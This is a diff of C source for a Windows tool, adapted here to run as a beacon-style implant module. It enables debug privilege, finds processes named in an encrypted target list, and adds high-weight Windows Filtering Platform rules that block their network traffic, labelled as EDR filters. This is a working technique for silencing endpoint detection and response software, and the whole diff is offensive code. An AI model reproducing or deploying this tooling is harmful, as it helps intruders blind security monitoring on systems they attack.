@@ -1,9 +1,6 @@
-#include <winsock2.h>
-#include <initguid.h>
-#include <fwpmu.h>
-#include "core.h"
-#include "errors.h"
-#include <strsafe.h>
+#include "common.h"
+
+
 
 // Helper prototypes
 static DWORD AddProviderAndSubLayer(HANDLE hEngine);
@@ -24,7 +21,7 @@ static void RemoveFiltersForProcess(HANDLE hEngine, PCWSTR fullPath);
  * - Each filter uses FWP_UINT64 weight of (UINT64)-1, so within our sublayer our rules dominate.
  */
 void configureNetworkFilters() {
-    if (!EnableSeDebugPrivilege()) { EPRINTF("[-] Failed to enable SeDebugPrivilege.\n"); return; }
+    if (!EnableSeDebugPrivilege()) { BeaconPrintf(CALLBACK_ERROR, "[-] Failed to enable SeDebugPrivilege.\n"); return; }
     
     HANDLE hEngine = NULL;
     if (FwpmEngineOpen0(NULL, RPC_C_AUTHN_WINNT, NULL, NULL, &hEngine) != ERROR_SUCCESS) { PrintDetailedError("FwpmEngineOpen0 failed", GetLastError()); return; }
@@ -40,8 +37,9 @@ void configureNetworkFilters() {
         if (Process32First(hSnapshot, &pe32)) {
             do {
                 for (size_t i = 0; i < PROCESS_DATA_COUNT; i++) {
-                    if (decryptedNames[i] && lstrcmpiA(pe32.szExeFile, decryptedNames[i]) == 0) {
-                        PRINTF("[+] Found target process: %s\n", pe32.szExeFile);
+                    wchar_t wDecryptedName[MAX_PATH];
+                        if (decryptedNames[i] && MultiByteToWideChar(CP_ACP, 0, decryptedNames[i], -1, wDecryptedName, MAX_PATH) > 0 && lstrcmpiW(pe32.szExeFile, wDecryptedName) == 0) {
+                        BeaconPrintf(CALLBACK_OUTPUT, "[+] Found target process: %s\n", pe32.szExeFile);
                         WCHAR fullPath[MAX_PATH];
                         if (getProcessFullPath(pe32.th32ProcessID, fullPath, MAX_PATH)) {
                             ApplyGenericBlockFilterForPath(hEngine, &SubLayerGUID, fullPath);
@@ -65,7 +63,7 @@ void configureNetworkFilters() {
  * This is the on-demand variant of configureNetworkFilters() when a single path is provided.
  */
 void addProcessRule(const char* processPath) {
-    if (!EnableSeDebugPrivilege()) { EPRINTF("[-] Failed to enable SeDebugPrivilege.\n"); return; }
+    if (!EnableSeDebugPrivilege()) { BeaconPrintf(CALLBACK_ERROR, "[-] Failed to enable SeDebugPrivilege.\n"); return; }
     HANDLE hEngine = NULL;
     if (FwpmEngineOpen0(NULL, RPC_C_AUTHN_WINNT, NULL, NULL, &hEngine) != ERROR_SUCCESS) { PrintDetailedError("FwpmEngineOpen0 failed", GetLastError()); return; }
     if (AddProviderAndSubLayer(hEngine) != ERROR_SUCCESS) { FwpmEngineClose0(hEngine); return; }
@@ -91,7 +89,7 @@ void removeAllRules() {
     DWORD result = FwpmEngineOpen0(NULL, RPC_C_AUTHN_WINNT, NULL, NULL, &hEngine);
     if (result != ERROR_SUCCESS) { PrintDetailedError("FwpmEngineOpen0 failed", result); return; }
 
-    PRINTF("[+] Starting comprehensive cleanup...\n");
+    BeaconPrintf(CALLBACK_OUTPUT, "[+] Starting comprehensive cleanup...\n");
 
     HANDLE enumHandle = NULL;
     FWPM_FILTER_ENUM_TEMPLATE0 enumTemplate = {0};
@@ -103,7 +101,7 @@ void removeAllRules() {
         UINT32 numEntries = 0;
         result = FwpmFilterEnum0(hEngine, enumHandle, 0xFFFFFFFF, &filters, &numEntries);
         if (result == ERROR_SUCCESS && numEntries > 0) {
-            PRINTF("[+] Removing %u filter(s)...\n", numEntries);
+            BeaconPrintf(CALLBACK_OUTPUT, "[+] Removing %u filter(s)...\n", numEntries);
             for (UINT32 i = 0; i < numEntries; i++) {
                 FwpmFilterDeleteById0(hEngine, filters[i]->filterId);
             }
@@ -113,15 +111,15 @@ void removeAllRules() {
     }
 
     result = FwpmSubLayerDeleteByKey0(hEngine, &SubLayerGUID);
-    if (result == ERROR_SUCCESS) { PRINTF("[+] WFP sublayer removed successfully.\n"); }
+    if (result == ERROR_SUCCESS) { BeaconPrintf(CALLBACK_OUTPUT, "[+] WFP sublayer removed successfully.\n"); }
     else if ((long)result != FWP_E_SUBLAYER_NOT_FOUND) { PrintDetailedError("FwpmSubLayerDeleteByKey0 failed", result); }
 
     result = FwpmProviderDeleteByKey0(hEngine, &ProviderGUID);
-    if (result == ERROR_SUCCESS) { PRINTF("[+] WFP provider removed successfully.\n"); }
+    if (result == ERROR_SUCCESS) { BeaconPrintf(CALLBACK_OUTPUT, "[+] WFP provider removed successfully.\n"); }
     else if ((long)result != FWP_E_PROVIDER_NOT_FOUND) { PrintDetailedError("FwpmProviderDeleteByKey0 failed", result); }
 
     FwpmEngineClose0(hEngine);
-    PRINTF("[+] Cleanup complete.\n");
+    BeaconPrintf(CALLBACK_OUTPUT, "[+] Cleanup complete.\n");
 }
 
 /*
@@ -138,7 +136,7 @@ static void ApplyGenericBlockFilterForPath(HANDLE hEngine, const GUID* subLayerG
     if (CustomFwpmGetAppIdFromFileName0(fullPath, &appId) != CUSTOM_SUCCESS) { return; }
     BOOL ipv4Exists = FilterExists(hEngine, &FWPM_LAYER_ALE_AUTH_CONNECT_V4, appId, EDR_FILTER_NAME);
     if (ipv4Exists) {
-        WPRINTF(L"    [!] Generic block filter for %s already exists. Skipping.\n", fullPath);
+        BeaconPrintf(CALLBACK_OUTPUT, "    [!] Generic block filter for %ls already exists. Skipping.\n", fullPath);
         FreeAppId(appId);
         return;
     }
@@ -168,11 +166,11 @@ static void ApplyGenericBlockFilterForPath(HANDLE hEngine, const GUID* subLayerG
     UINT64 filterId = 0;
     blockFilter.layerKey = FWPM_LAYER_ALE_AUTH_CONNECT_V4;
     result = FwpmFilterAdd0(hEngine, &blockFilter, NULL, &filterId);
-    if (result == ERROR_SUCCESS) { WPRINTF(L"    [+] Generic block filter added for %s (ID: %llu, IPv4).\n", fullPath, filterId); }
+    if (result == ERROR_SUCCESS) { BeaconPrintf(CALLBACK_OUTPUT, "    [+] Generic block filter added for %ls (ID: %llu, IPv4).\n", fullPath, filterId); }
     
     blockFilter.layerKey = FWPM_LAYER_ALE_AUTH_CONNECT_V6;
     result = FwpmFilterAdd0(hEngine, &blockFilter, NULL, &filterId);
-    if (result == ERROR_SUCCESS) { WPRINTF(L"    [+] Generic block filter added for %s (ID: %llu, IPv6).\n", fullPath, filterId); }
+    if (result == ERROR_SUCCESS) { BeaconPrintf(CALLBACK_OUTPUT, "    [+] Generic block filter added for %ls (ID: %llu, IPv6).\n", fullPath, filterId); }
 
     result = FwpmTransactionCommit0(hEngine);
     if (result != ERROR_SUCCESS) { PrintDetailedError("Generic FwpmTransactionCommit0 failed", result); FwpmTransactionAbort0(hEngine); }
@@ -279,9 +277,9 @@ static void RemoveFiltersForProcess(HANDLE hEngine, PCWSTR fullPath) {
     }
 
     if (totalRemoved > 0) {
-        WPRINTF(L"[+] Found and removed %u rule(s) for %s\n", totalRemoved, fullPath);
+        BeaconPrintf(CALLBACK_OUTPUT, "[+] Found and removed %u rule(s) for %ls\n", totalRemoved, fullPath);
     } else {
-        WPRINTF(L"[!] No matching rules found for %s\n", fullPath);
+        BeaconPrintf(CALLBACK_OUTPUT, "[!] No matching rules found for %ls\n", fullPath);
     }
 
     FreeAppId(appId);
@@ -322,11 +320,11 @@ void listRules() {
         return;
     }
 
-    PRINTF("[+] Found %u filter(s) for provider.\n", numEntries);
+    BeaconPrintf(CALLBACK_OUTPUT, "[+] Found %u filter(s) for provider.\n", numEntries);
     for (UINT32 i = 0; i < numEntries; i++) {
         UINT64 id = filters[i]->filterId;
         const wchar_t* name = filters[i]->displayData.name ? filters[i]->displayData.name : L"(no name)";
-        WPRINTF(L"    ID: %llu  Name: %s\n", id, name);
+        BeaconPrintf(CALLBACK_OUTPUT, "    ID: %llu  Name: %ls\n", id, name);
     }
 
     if (filters) {
@@ -343,13 +341,13 @@ void listRules() {
  */
 void removeRulesByPath(const char* processPath) {
     if (!EnableSeDebugPrivilege()) {
-        EPRINTF("[-] Failed to enable SeDebugPrivilege. This is required to remove rules.\n");
+        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to enable SeDebugPrivilege. This is required to remove rules.\n");
         return;
     }
 
     wchar_t wProcessPath[MAX_PATH];
     if (MultiByteToWideChar(CP_ACP, 0, processPath, -1, wProcessPath, MAX_PATH) == 0) {
-        EPRINTF("[-] Failed to convert process path to wide string.\n");
+        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to convert process path to wide string.\n");
         return;
     }
 
@@ -360,7 +358,7 @@ void removeRulesByPath(const char* processPath) {
         return;
     }
 
-    PRINTF("[+] Attempting to remove all filters for process: %s\n", processPath);
+    BeaconPrintf(CALLBACK_OUTPUT, "[+] Attempting to remove all filters for process: %s\n", processPath);
     RemoveFiltersForProcess(hEngine, wProcessPath);
 
     FwpmEngineClose0(hEngine);
@@ -384,7 +382,7 @@ void removeRuleById(UINT64 ruleId) {
 
     result = FwpmFilterDeleteById0(hEngine, ruleId);
     if (result == ERROR_SUCCESS) {
-        PRINTF("[+] Successfully removed rule with ID %llu.\n", ruleId);
+        BeaconPrintf(CALLBACK_OUTPUT, "[+] Successfully removed rule with ID %llu.\n", ruleId);
     } else {
         char contextBuffer[128];
         StringCchPrintfA(contextBuffer, 128, "Failed to remove rule with ID %llu", ruleId);
